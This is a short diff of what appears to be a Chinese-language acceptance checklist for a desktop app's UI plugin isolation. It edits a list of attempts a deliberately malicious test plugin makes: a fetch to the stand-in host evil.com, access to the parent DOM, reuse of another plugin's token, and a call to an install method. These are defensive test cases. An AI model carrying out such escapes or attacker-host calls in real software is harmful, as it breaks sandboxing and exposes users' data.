@@ -403,7 +403,7 @@ just desktop-dev
 
 # 3. UI 插件隔离（★ 关键验收）
 # 故意写一个恶意 UI 插件：
-#   · 尝试 fetch('http://evil.com') → 被 CSP 的 connect-src 'none' 阻止
+#   · 尝试 fetch('http://evil.com') → 被 CSP 的本机 IPC 白名单阻止
 #   · 尝试访问宿主 DOM（window.parent.document）→ 跨 origin 被阻止
 #   · 尝试用别的插件的令牌 → IPC 拒绝
 #   · 尝试调 PluginInstall → 方法白名单拒绝
